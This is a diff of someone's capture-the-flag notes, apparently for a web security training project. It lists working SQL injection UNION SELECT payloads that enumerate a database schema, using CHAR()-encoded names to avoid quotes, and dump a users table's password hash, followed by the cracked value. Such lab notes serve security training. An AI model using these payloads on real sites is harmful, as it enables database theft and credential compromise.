@@ -1,10 +1,28 @@
+in http://${IP}/index.php?page=member
+
+https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html
+https://www.mssqltips.com/sqlservertutorial/183/informationschemacolumns/
+
 12 UNION SELECT 1, DATABASE()
 
 Member_Sql_Injection CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110)
 
-12 UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.Columns WHERE 
+12 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE 
 TABLE_SCHEMA = CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110)
 
+ 12 UNION SELECT user_id, Commentaire FROM users
+
+ 12 UNION SELECT user_id, countersign FROM users WHERE user_id = 5
+
+Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+get the flag countersign 5ff9d0165b4f92b14994e5c685cdce28
+
+ 5ff9d0165b4f92b14994e5c685cdce28:FortyTwo
+
+//=================================================
+
+12 UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.Columns WHERE 
+TABLE_SCHEMA = CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110)
 
 user_id CHAR(117, 115, 101, 114, 95, 105, 100)
 first_name
@@ -15,13 +33,4 @@ planet
 Commentaire
 countersign
 
-12 UNION SELECT 1, user_id FROM INFORMATION_SCHEMA.Columns WHERE 
-TABLE_SCHEMA = CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110)
- AND TABLE_NAME = CHAR(117, 115, 101, 114, 115)
 
- 12 UNION SELECT 1, Commentaire FROM users WHERE user_id = 5
-
-Decrypt this password -> then lower all the char. Sh256 on it and it's good !
-get the flag countersign 5ff9d0165b4f92b14994e5c685cdce28
-
- 5ff9d0165b4f92b14994e5c685cdce28:FortyTwo
